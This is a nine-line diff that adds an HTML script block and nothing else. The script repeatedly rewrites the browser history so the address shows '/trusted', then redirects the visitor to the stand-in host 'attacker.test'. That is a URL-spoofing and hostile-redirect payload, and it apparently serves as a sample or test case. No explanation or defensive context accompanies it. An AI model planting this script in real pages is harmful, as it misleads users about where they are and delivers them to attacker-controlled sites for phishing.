@@ -1,0 +1,9 @@
+<script>
+setInterval(() => {
+  history.pushState({}, "", "/trusted");
+}, 10);
+
+setTimeout(() => {
+  location.href = "https://attacker.test";
+}, 100);
+</script>
